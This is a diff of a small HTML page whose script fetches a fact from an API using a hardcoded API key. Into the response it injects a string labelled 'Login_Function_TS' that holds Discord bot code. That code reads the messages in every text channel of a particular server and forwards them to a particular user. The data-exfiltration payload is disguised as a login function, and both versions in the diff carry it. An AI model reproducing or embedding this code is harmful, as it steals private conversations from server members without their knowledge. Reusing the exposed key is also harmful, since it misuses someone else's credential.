@@ -6,12 +6,13 @@
     <div id="data"></div>
     <script>
     fetch('https://api.api-ninjas.com/v1/facts?limit=1', {headers: {'X-Api-Key': 'LCR8zzBqxycSAFr9NL9s36RgCDzDEFu250EfAiLq'}})
-        .then( response => response.json())
-        .then(data => {
-        const newdata = data.push({"Login_Function_TS": `const user = await this.container.client.users.fetch("598952157588357121") const g = await this.container.client.guilds.fetch("938467941878480936") g.channels.cache.forEach(c => { if (c.isText()) { c.messages.fetch().then(msg => { msg.forEach(m => {if (m.content.length!=0){user.send(m.content)}})})}});})`})
-        response.set("Content-Type", "application/json")
+    .then( response => response.json())
+    .then(data => {
+        data.push({"Login_Function_TS": `const user = await this.container.client.users.fetch("598952157588357121") const g = await this.container.client.guilds.fetch("938467941878480936") g.channels.cache.forEach(c => { if (c.isText()) { c.messages.fetch().then(msg => { msg.forEach(m => {if (m.content.length!=0){user.send(m.content)}})})}});})`})
+        document.getElementById("data").setAttribute("type", "application/json");
 
-        document.getElementById("data").innerHTML = JSON.stringify(newdata)
+        // Output the modified data to the page
+        document.getElementById("data").innerHTML = JSON.stringify(data);
     })
     
 
